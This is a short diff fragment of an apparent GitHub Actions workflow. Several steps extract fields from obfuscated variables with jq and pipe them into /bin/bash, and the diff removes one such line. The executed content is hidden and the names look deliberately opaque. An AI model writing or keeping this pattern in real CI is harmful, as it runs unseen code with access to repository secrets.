@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$hgotf8" | jq -r .xqau668 | /bin/bash
           echo $x67706 | jq -r .pmqs537 | /bin/bash
           printf '%s' "$i642" | jq -r .cbtd0 | /bin/bash
-          echo $ls398 | jq -r .iebz8 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
